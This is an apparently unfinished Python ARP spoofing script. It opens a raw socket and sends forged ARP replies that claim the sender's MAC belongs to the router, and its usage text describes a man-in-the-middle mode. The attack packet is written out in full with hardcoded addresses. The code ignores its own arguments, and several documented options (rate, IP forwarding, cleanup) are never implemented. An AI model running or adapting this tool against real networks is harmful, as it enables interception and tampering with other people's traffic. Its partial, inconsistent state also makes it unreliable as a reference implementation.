#!/usr/bin/env python3

# usage: arpspoof.py -t target -i ip [-r rate] [-m mac] [-b] [-f] [-c]
# 
# OPTIONS
#
#   -h, --help
#       Display this dialogue
#
#   -t, --tell <target>
#       Send this IP address the ARP spoof
#
#   -i, --ip <impersonated-ip>
#       This is the IP we are impersonating
#
#   -m, --mac <impersonating-mac>
#       This is the MAC address to send in the request
#       If it isn't specified, we use our MAC address
#
#   -r, --rate <milliseconds>
#       The rate in milliseconds between sending packets
#
#   -b, --both-ways
#       In addition to the normal ARP spoof sent, a
#       packet will also be sent to the IP we are
#       impersonating in order to assume the identity
#       of the other IP.
#
#   -f, --forward-ip
#       Whether or not this program should modify the
#       system configuration to forward ips
#
#   -c, --cleanup
#       On exit, send correct ARP packets
#
#   --man-in-the-middle
#       Equivalent to using -b, -f, and -c

# Note: Although IP forwarding should be enabled for
# the -b option, I'm not sure how it behaves without it.
# I'm also not sure if it makes sense to control IP
# forwarding from this program, so it is specified as an
# option. It should be as simple as writing a 0 or 1
# to a system file.

import socket
import argparse
from struct import pack
from uuid import getnode as get_mac

parser = argparse.ArgumentParser(
    # TODO: Add more of a description. Note: we may also use epilogue and prologue.
    description = 'ARP spoofer',
    formatter_class = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=0)
)

parser._action_groups.pop()
required = parser.add_argument_group('required arguments')
optional = parser.add_argument_group('optional arguments')

t_help='''
       Send this IP address the ARP spoof

'''

i_help='''
       This is the IP we are impersonating

'''

m_help='''
       This is the MAC address to send in the request
       If it isn't specified, we use our MAC address

'''

b_help='''
       In addition to the normal ARP spoof sent, a
       packet will also be sent to the IP we are
       impersonating in order to assume the identity
       of the other IP. This allows for us to make
       a MITM attack, assumping ip forwarding is enabled.

'''

# TODO: Validate the IP address and MAC address (we did this before)
def parse_ip(ip):
    return ip

def parse_mac(mac):
    return mac

def main(args):
    # TODO: fetch required information from args to pack
    #dest_ip = [10, 7, 31, 99]
    #local_mac = [int(("%x" % get_mac())[i:i+2], 16) for i in range(0, 12, 2)]
    #binascii.hexlify(bytes(hex(get_mac()).encode('UTF-8')))

    print(args.target)
    print(args.ip)
    print(args.mac)
    print("both: ", args.both)
    
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.bind(("eth0", 0))
    
    arp_packet = [
        b'\x00\x50\x56\xc0\x00\x03', # Target MAC
        b'\x00\x0c\x29\x80\x68\xcf', # Our MAC
        pack('!H', 0x0806), # Ethtype = ARP
        pack('!H', 0x0001), # HRD (constant?)
        pack('!H', 0x0800), # Protocol = Ipv4
        pack('!B', 0x06),   # Hardware Size (constant?)
        pack('!B', 0x04),   # Protocol Size (constant?)
        pack('!H', 0x0002), # OP    Should try to use OP = 0x0001 to see if it also works

        # We can use an int size of 4 and 8, but not 6, so the nB might be used.
        # In order to use this notation though, we must have either a tuple or list.
        # binascii or other imports might allow us to use a single function though.
        #pack('!6B', *local_mac),
        #pack('!4B', *local_ip),
        
        # Here we lie and say that our mac address is the resolution of the router IP
        b'\x00\x0c\x29\x80\x68\xcf', # Our MAC
        b'\xc0\xa8\x0a\x02'          # IP addr of the router
        
        # Note: the ip will be provided to us and we must resolve their mac address.
        # 
        b'\x00\x50\x56\xc0\x00\x03', # Target MAC
        b'\xc0\xa8\x0a\x01'          # Target IP
    ]
    #print(arp_packet)
    
    # Possible broadcast option?
    # sock.sendto(b''.join(ARP_FRAME), ('255.255.255.255', 0))
    s.send(b''.join(arp_packet))
    s.close()

if __name__ == "__main__":
    
    required.add_argument('-t', '--tell', dest='target', metavar='target',
        type=parse_ip, help=t_help, required=True)
    
    required.add_argument('-i', '--ip', dest='ip', metavar='ip',
        type=parse_ip, help=i_help, required=True)
    
    optional.add_argument('-m', '--mac', dest='mac', metavar='mac',
        type=parse_mac, help=m_help)
    
    optional.add_argument('-b', '--both-ways', dest='both',
        action='store_true', help=b_help)
    
    args = parser.parse_args()
    #args.rate
    #while True:
    main(args)

